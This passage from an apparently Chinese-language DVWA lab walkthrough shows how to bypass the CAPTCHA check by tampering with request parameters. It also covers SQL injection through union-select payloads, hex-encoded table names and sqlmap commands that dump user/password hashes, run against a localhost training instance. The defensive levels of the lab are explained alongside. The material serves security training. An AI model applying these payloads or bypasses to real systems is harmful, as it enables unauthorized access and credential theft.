true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party</span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ &#x27;recaptcha_private_key&#x27;],</span><br><span class="line">        $_POST[&#x27;g-recaptcha-response&#x27;]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail?</span><br><span class="line">    if( !$resp ) &#123;</span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // CAPTCHA was correct. Do both new passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // Show next stage for the user</span><br><span class="line">            echo &quot;</span><br><span class="line">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span><br><span class="line">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;</span><br><span class="line">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Both new passwords do not match.</span><br><span class="line">            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;</span><br><span class="line">            $hide_form = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) &amp;&amp; ( $_POST[ &#x27;step&#x27; ] == &#x27;2&#x27; ) ) &#123;</span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Check to see if both password match</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with the passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>步骤分为两步，第一步输入两次密码后验证CAPTCH是否通过，如果两次密码一样并且通过验证，则提示按按钮来确认，于是来到第二步，更新密码</p>
<p>修改密码时需要验证是否是真人</p>
<p>抓包看看，可以看到我现在正处于第一步，并且有g-recaptcha-response参数，用于验证用户的交互以确认他们是真实的用户而非自动化脚本或机器人</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241039323.png" alt="image-20240524103938205"></p>
<p>那么我们直接跳过这一步，将step值改为2再发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042392.png" alt="image-20240524104256356"></p>
<p>成功修改密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241042729.png" alt="image-20240524104236685"></p>

        <h2 id="Medium-5"   >
          <a href="#Medium-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241055812.png" alt="image-20240524105545774"></p>
<p>第二步中新增了检查 POST 请求中 <code>passed_captcha</code> 参数是否为True</p>
<p>抓包修改step的值为2，并且增加一个<code>passed_captcha</code> 参数，值为true</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241106627.png" alt="image-20240524110624587"></p>
<p>发送，修改成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241108352.png" alt="image-20240524110825309"></p>

        <h2 id="High-5"   >
          <a href="#High-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-5" class="headerlink" title="High"></a>High</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241122687.png" alt="image-20240524112233649"></p>
<p>检查 POST 数据中，<code>g-recaptcha-response</code> 字段是否等于 <code>&#39;hidd3n_valu3&#39;</code>，检查User-Agent是否被设置为 <code>&#39;reCAPTCHA&#39;</code>，并且取消了第二步</p>
<p>所以抓包修改<code>g-recaptcha-response</code> 的值为 <code>hidd3n_valu3</code>，User-Agent值为reCAPTCHA</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125526.png" alt="image-20240524112524481"></p>
<p>发送，修改成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241125100.png" alt="image-20240524112537064"></p>

        <h2 id="Impossible-5"   >
          <a href="#Impossible-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看源代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form</span><br><span class="line">    $hide_form = true;</span><br><span class="line"></span><br><span class="line">    // Get input</span><br><span class="line">    $pass_new  = $_POST[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &#x27;password_conf&#x27; ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_conf ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &#x27;password_current&#x27; ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party</span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ &#x27;recaptcha_private_key&#x27; ],</span><br><span class="line">        $_POST[&#x27;g-recaptcha-response&#x27;]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail?</span><br><span class="line">    if( !$resp ) &#123;</span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">        $hide_form = false;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $data = $db-&gt;prepare( &#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( &#x27;:password&#x27;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct?</span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">            // Update the database</span><br><span class="line">            $data = $db-&gt;prepare( &#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27; );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:password&#x27;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success!</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Feedback for the end user - failed!</span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;;</span><br><span class="line">            $hide_form = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>检查 Anti-CSRF 令牌，验证用户会话中的 CSRF 令牌是否有效，以防止 CSRF 攻击</p>
<p>用户输入的新密码和确认密码都通过 <code>stripslashes</code> 和 <code>mysqli_real_escape_string</code> 处理以防止 SQL 注入，并使用 MD5 进行加密</p>
<p>并且还会检查当前密码是否正确，并使用预处理语句查询数据库验证当前密码</p>

        <h1 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1>
      
        <h2 id="Low-6"   >
          <a href="#Low-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211513362.png" alt="image-20240521151351307"></p>

        <h3 id="手工注入"   >
          <a href="#手工注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3>
      
        <h4 id="首先判断是否存在注入且注入类型"   >
          <a href="#首先判断是否存在注入且注入类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#首先判断是否存在注入且注入类型" class="headerlink" title="首先判断是否存在注入且注入类型"></a>首先判断是否存在注入且注入类型</h4>
      <p>输入一个数字1，查询成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211514062.png" alt="image-20240521151423024"></p>
<p>输入1’，返回错误，说明存在SQL注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211515222.png" alt="image-20240521151510181"></p>
<p>再试试1’or ‘1’=’1，查询成功，说明是字符型注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211516022.png" alt="image-20240521151620992"></p>

        <h4 id="查看列数"   >
          <a href="#查看列数" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br><span class="line">&#x27; union select 1,2,3;#</span><br></pre></td></tr></table></div></figure>

<p>依次尝试，发现只有两列</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211522744.png" alt="image-20240521152233711"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211523383.png" alt="image-20240521152307352"></p>

        <h4 id="获取当前数据库"   >
          <a href="#获取当前数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(schema_name) from information_schema.schemata;#</span><br></pre></td></tr></table></div></figure>

<p>发现数据库名称为dvwa </p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211549055.png" alt="image-20240521154916026"></p>

        <h4 id="获取数据表名"   >
          <a href="#获取数据表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211550951.png" alt="image-20240521155037919"></p>

        <h4 id="查看表字段名"   >
          <a href="#查看表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211552757.png" alt="image-20240521155230718"></p>
<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>

        <h4 id="查看字段内容"   >
          <a href="#查看字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(user,password) from dvwa.users;#</span><br></pre></td></tr></table></div></figure>

<p>可以看的users表中所有用户的user、password的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211556881.png" alt="image-20240521155658847"></p>

        <h3 id="Sqlmap"   >
          <a href="#Sqlmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3>
      
        <h4 id="获取当前数据库-1"   >
          <a href="#获取当前数据库-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241330520.png" alt="image-20240524133052476"></p>

        <h4 id="获取数据库表名"   >
          <a href="#获取数据库表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241331421.png" alt="image-20240524133140382"></p>

        <h4 id="查看表字段名-1"   >
          <a href="#查看表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-1" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241332189.png" alt="image-20240524133224149"></p>

        <h4 id="查看字段内容-1"   >
          <a href="#查看字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-1" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241333134.png" alt="image-20240524133321086"></p>
<p>查看源代码发现对输入没有什么限制</p>

        <h2 id="Medium-6"   >
          <a href="#Medium-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211600670.png" alt="image-20240521160040637"></p>
<p>界面上只能下拉来改变输入</p>
<p>尝试使用HackBar来用POST方法提交数据</p>

        <h4 id="判断注入类型"   >
          <a href="#判断注入类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入1，页面能正常返回查询到的数据</p>
<p>有&amp;Submit=Submit的原因：网页基于检测特定的提交按钮来触发相应的数据库操作或其他逻辑的。如果不包括这个参数，服务器端的脚本可能不会执行期望的操作</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211636361.png" alt="image-20240521163641322"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211637282.png" alt="image-20240521163715255"></p>
<p>输入1’or ‘1’=’1，报错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211641567.png" alt="image-20240521164115536"></p>
<p>输入1 or 1 = 1，返回了所有数据，说明是数字型注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211642588.png" alt="image-20240521164209548"></p>

        <h4 id="查看列数-1"   >
          <a href="#查看列数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-1" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入1 order by 1，从1一直试直到报错，即可获得字段数，直到3报错，所以列数为2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211643275.png" alt="image-20240521164353245"></p>

        <h4 id="获取当前数据库-2"   >
          <a href="#获取当前数据库-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取当前数据库-2" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,database();</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-1"   >
          <a href="#获取数据库表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-1" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p>但是报错，再换一个方式</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221101651.png" alt="image-20240522110132595"></p>

        <h4 id="查看表字段名-2"   >
          <a href="#查看表字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表字段名-2" class="headerlink" title="查看表字段名"></a>查看表字段名</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;;#</span><br></pre></td></tr></table></div></figure>

<p>又报错，查看信息发现是’被转义成了&#39;，所以上一步也会报错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211655692.png" alt="image-20240521165521659"></p>
<p>可以转换成十六进制，user转换成十六进制为0x7573657273</p>
<p>因此输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273;#</span><br></pre></td></tr></table></div></figure>


        <h4 id="查看字段内容-2"   >
          <a href="#查看字段内容-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看字段内容-2" class="headerlink" title="查看字段内容"></a>查看字段内容</h4>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,group_concat(user,password) from dvwa.users;#</span><br></pre></td></tr></table></div></figure>



<p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211707114.png" alt="image-20240521170706087"></p>
<p>使用<code>mysqli_real_escape_string</code> 函数，通过对字符串中的特定字符进行转义处理，在特定字符前添加反斜线 <code>\</code> ，特定字符包括’、”、\、NUL 字符、\n、\r、\x1A(在 Windows 系统中，Control-Z (<code>\x1A</code>) 被解释为文件结束标记)</p>

        <h2 id="High-6"   >
          <a href="#High-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-6" class="headerlink" title="High"></a>High</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211718721.png" alt="image-20240521171834684"></p>
<p>点击是一个新窗口，可以在里面输入数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211719285.png" alt="image-20240521171902252"></p>
<p>步骤和Low相同</p>
<p>关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211721487.png" alt="image-20240521172121454"></p>
<p>从 SESSION 获取 id 值，所以这里不能直接在当前页面注入，<code>LIMIT 1</code> 的作用是确保查询结果最多只返回一条记录</p>

        <h2 id="Impossible-6"   >
          <a href="#Impossible-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211732457.png" alt="image-20240521173224409"></p>
<p>依然是用令牌来防止CSRF攻击，并且检测id是否为数字，使用 PDO 预处理语句来防止SQL注入攻击</p>

        <h1 id="八、SQL注入（盲注）"   >
          <a href="#八、SQL注入（盲注）" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、SQL注入（盲注）" class="headerlink" title="八、SQL注入（盲注）"></a>八、SQL注入（盲注）</h1>
      
        <h2 id="Low-7"   >
          <a href="#Low-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908607.png" alt="image-20240522090817496"></p>
<p>输入1，返回信息存在，但是没有显示出具体的信息，可以判断是盲注</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220908944.png" alt="image-20240522090844910"></p>

        <h3 id="布尔盲注"   >
          <a href="#布尔盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3>
      
        <h4 id="判断注入类型-1"   >
          <a href="#判断注入类型-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入1’ or ‘1’ = ‘1，返回错误，所以是字符型的注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405220909854.png" alt="image-20240522090936814"></p>

        <h4 id="查看列数-2"   >
          <a href="#查看列数-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-2" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入</p>
